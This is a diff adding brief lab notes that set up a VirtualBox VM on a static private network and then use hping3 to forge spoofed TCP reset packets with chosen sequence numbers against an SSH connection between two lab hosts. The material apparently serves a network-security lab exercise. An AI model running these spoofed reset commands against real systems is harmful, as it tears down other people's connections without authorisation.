@@ -1,0 +1,25 @@
+Enable promiscuous mode for vm in virtualbox
+
+sudo vim /etc/netplan/<file_name>.yaml
+
+network:
+    version: 2
+    ethernets:
+        enp0s3:
+            dhcp4: false
+            addresses: [192.168.2.2/24]
+            routes:
+                - to: default
+                  via: 192.168.2.1
+            nameservers:
+                addresses: [8.8.8.8]
+                  
+
+sudo netplan apply
+
+sudo hping3 -V -c 1 -R -s <source_port> -p 22 -a 192.168.2.2 --win <window_size> --setseq <sequence_number> --setack <acknowledgment_number> 192.168.2.3
+
+sudo hping3 -V -c 1 -R -s 22  -p <source_port>  -a 192.168.2.3 --win <window_size> --setseq <acknowledgment_number> --setack <sequence_number> 192.168.2.2
+
+Maybe try this one too
+sudo hping3 -a 192.168.2.2 -c 192.168.2.3 -s <source_port> -p <destination_port> -R -M <sequence_number> -L <acknowledgment_number>
